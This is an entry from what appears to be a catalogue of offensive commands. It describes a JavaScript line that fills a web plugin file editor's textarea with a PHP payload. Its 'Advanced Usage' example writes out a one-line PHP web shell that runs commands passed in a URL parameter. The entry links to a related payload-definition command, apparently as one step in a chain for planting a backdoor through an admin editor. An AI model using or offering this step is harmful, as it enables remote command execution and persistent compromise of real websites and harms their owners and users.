---
data: c.value = p
tags:
  - dom
  - injection
type: command
executor: javascript
platforms:
  - Web
id: 98153498-8e83-45ab-849d-c8b95cb3149c
created_at: '2025-12-14T17:23:20.636Z'
updated_at: '2025-12-14T17:23:20.636Z'
verified: false
validated: true
submitted: true
---
# set-textarea-value

## Command

```javascript
c.value = p
```

## Description

This JavaScript command sets the value property of the selected textarea (c) to the PHP payload string (p), injecting code into the plugin file editor.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| c | Textarea element | Yes |
| p | PHP code string variable | Yes |

## Examples

### Basic Usage

```javascript
c.value = p
```

### Advanced Usage

```javascript
c.value = "<?php eval($_GET['cmd']); ?>"; // For command execution
```

## Expected Output

Textarea content updated to the payload; no visible output until form submission.

## Related

- [[commands/define-php-payload]]
